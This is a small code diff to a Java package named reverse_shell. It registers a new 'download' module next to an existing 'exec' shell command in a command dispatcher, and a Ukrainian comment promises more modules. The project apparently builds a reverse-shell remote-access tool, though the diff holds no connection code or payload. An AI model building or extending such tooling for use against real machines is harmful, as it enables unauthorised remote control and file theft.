@@ -3,6 +3,8 @@ package reverse_shell;
 import java.net.Socket;
 import java.util.HashMap;
 import java.util.Map;
+import reverse_shell.modules.DownloadCommand;
+
 
 import reverse_shell.modules.ShellCommand;
 
@@ -11,6 +13,7 @@ public class Dispatcher {
 
     public Dispatcher() {
         commands.put("exec", new ShellCommand());
+        commands.put("download", new DownloadCommand());
         // Додаткові модулі додаватимемо тут
     }
 
